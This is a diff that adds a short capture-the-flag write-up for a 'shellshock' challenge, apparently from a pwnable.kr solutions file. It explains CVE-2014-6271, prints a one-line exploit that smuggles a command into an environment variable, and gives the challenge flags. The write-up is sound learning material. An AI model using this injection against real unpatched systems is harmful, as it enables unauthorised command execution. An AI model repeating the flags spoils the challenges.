@@ -219,3 +219,16 @@ print("pw_buf2:", pw_buf2)                   # @@@@@@@@@@
 ```
 #### Flag
 Mommy, the operator priority always confuses me :(
+
+
+## shellshock
+The name of the challenge quite indicates the weakness...  
+The machine is vulnerable to [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271) ('shellshock') (this can also be seen by checking the bash version):
+```shell
+shellshock@pwnable:~$ env VAR='() { :; }; /bin/cat flag' ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault (core dumped)
+```
+#### Flag
+only if I knew CVE-2014-6271 ten years ago..!!
+
